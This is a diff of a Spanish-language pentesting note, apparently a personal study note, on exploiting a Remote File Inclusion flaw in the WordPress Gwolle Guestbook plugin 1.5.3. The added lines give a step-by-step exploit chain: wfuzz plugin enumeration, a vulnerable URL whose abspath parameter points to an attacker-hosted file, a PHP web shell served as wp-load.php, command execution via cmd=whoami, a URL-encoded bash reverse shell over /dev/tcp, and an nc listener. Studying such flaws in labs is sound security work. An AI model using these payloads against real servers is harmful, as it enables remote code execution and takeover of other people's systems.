@@ -1,6 +1,6 @@
-# Remote File Inclusión (RFI)
+# RFI
 
-Tags: #RFI #OWASP #Explotacion
+Tags: #RFI 
 
 La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir** **archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.
 
@@ -16,30 +16,59 @@ Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwol
 
 - **Gwolle Guestbook**: [https://es.wordpress.org/plugins/gwolle-gb/](https://es.wordpress.org/plugins/gwolle-gb/)
 
-## Código
-
-Para descubrir si tiene el Plugin de **gwolle-gb**
-
 ```bash 
-❯ wfuzz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt http://❮IP❯/FUZZ
-
-# hc -> HideCode 404
-# c -> Formato colorido
-# w -> Ruta del diccionario
-# FUZZ -> Donde va a insertar las palabras el diccionario
-# t -> Lanzar tareas en paralelo al mismo tiempo
+# Este tipo de ataques son convenientes cuando:
+1. Podemos apuntar a un archivo php y este archivo interpreta ese lenguaje 
 ```
 
-**Nota**: El PHP de la victima debe de tener '**allow_url_include = 'ON'**', de lo contrario no va a funcionar
-Podemos explotar la vulnerabilidad agregando desde '/wp-content/' esto a la url de la pagina web:
+## Enumeración de plugin en WP
 
 ```bash 
-❯ http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.68.11/ # Colocamos nuestra IP y lo que hara ese comando es intentar cargar un archivo 'GET /wp-load.php HTTP/1.0'
+# Forma de descubrir los plugins existentes en un Wordpress
+
+❯ wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/web-content/CMS/wp-plugins.fuzz.txt http://<IP>/FUZZ
+
+	# c = Formato colorizado 
+	# hc = Hide Code 404
+	# t = Usar 200 peticiones al mismo tiempo
+	# w = Ruta absoluta del diccionario a usar
 ```
 
-Debemos de tener activo un servidor http en nuestra maquina de atacante
+## Wordpress plugin Gwolle
 
 ```bash 
-❯ python3 -m http.server 80 # Nos montamos un servidor http 80
+# Esta vulnerabilidad de RFI se da en un Wordpress en la parte de su plugin 'Gwolle' 1.5.3
+
+❯ http://IP/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<hacker_website>/
 ```
 
+```bash 
+# Del lado del atacante debemos de tener un servidor http ejecutandose con el archivo a compartir
+
+❯ python3 -m http.server 80 
+```
+
+```bash 
+# Archivo malicioso a compartir 
+❯ wp-load.php 
+
+<?php 
+	system($_GET['cmd']);
+?>
+```
+
+```bash 
+# Por lo que ahora en la URL al final debemos de agregar '&cmd=' ya que no podemos tener dos '?cmd=' en una misma URL
+
+?abspath=http://<hacker_website>/&cmd=whoami
+
+# Podemos agregar una revershell en la URL de la siguiente manera:
+❯ bash -c "bash -i >& /dev/tcp/IP/443 0>&1"
+	# El '&' debemos de urlencodearlo = %26
+❯ bash -c "bash -i >%26 /dev/tcp/IP/443 0>%261"
+```
+
+```bash 
+# Nos ponemos en escucha en nuestra maquina de atacante para recibir la revershell
+❯ nc -nlvp 443 
+```
